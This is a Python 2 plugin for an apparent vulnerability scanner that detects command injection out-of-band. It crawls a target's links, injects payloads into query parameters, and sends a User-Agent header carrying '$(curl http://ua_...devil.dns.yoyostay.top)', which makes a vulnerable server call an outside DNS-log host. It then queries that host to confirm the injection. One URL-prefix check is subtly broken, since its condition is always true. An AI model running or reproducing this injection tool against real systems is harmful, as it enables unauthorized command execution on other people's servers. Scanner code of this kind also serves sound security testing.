# coding=utf-8
import urllib2
import re
import urllib
import requests
import urlparse
import HTMLParser
from config import *


def get_url(domain, timeout):
    url_list = []
    try:
        res = urllib2.urlopen('http://' + domain, timeout=timeout)
    except Exception as e:
        return []
    html = res.read()
    root_url = res.geturl()
    m = re.findall("<a[^>]*?href=('|\")(.*?)\\1", html, re.I)
    if m:
        for url in m:
            ParseResult = urlparse.urlparse(url[1])
            if ParseResult.netloc and ParseResult.scheme:
                if domain == ParseResult.hostname:
                    url_list.append(HTMLParser.HTMLParser().unescape(url[1]))
            elif not ParseResult.netloc and not ParseResult.scheme:
                url_list.append(HTMLParser.HTMLParser().unescape(urlparse.urljoin(root_url, url[1])))
    return list(set(url_list))


def check(domain):
    try:
        url = 'http://dnslog.yoyostay.top/api/dns/devil/{}/'
        resp = requests.get(url.format(domain)).content
        if 'True' in resp:
            return True
    except:
        return False

    return False


def verify(ip, port=80, name='http', timeout=10, types='ip'):
    if 'http' not in name.lower():
        return

    if types == 'ip':
        url = ip + ':' + str(port)
    else:
        url = ip
    domain = url.replace(':', '_').replace('/','_').replace('.', '_')



    urllist = get_url(url, 10)
    for url in urllist:
        parsed_url = urlparse.urlparse(url)
        if not parsed_url.query:
            continue

        ci_payload = getPayload(parsed_url.query, 'ci')

        for payload in ci_payload:
            query = urllib.urlencode(payload).replace('{domain}', domain)
            target = urlparse.urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, query, parsed_url.fragment))
            try:
                resp = requests.get(target, verify=False, timeout=10)
            except Exception as e:
                continue

        if check(domain):
            info = {
                'url': url,
                'vuln_name': 'command injection',
                'proof': domain,
                'severity': 'high',
                }
            return info

    headers = {
        'User-Agent': '$(curl http://ua_{domain}.devil.dns.yoyostay.top)'.format(domain=domain),
    }

    if not url.startswith('http:/') or not url.startswith('https:/'):
        url = 'http://' + url

    try:
        resp = requests.get(url, headers=headers, verify=False, timeout=10)
    except Exception as e:
        pass

    aim = 'ua_' + domain
    if check(aim):
        info = {
            'url': url,
            'vuln_name': 'ua command injection',
            'proof': aim,
            'severity': 'high',
            }
        return info

    return None
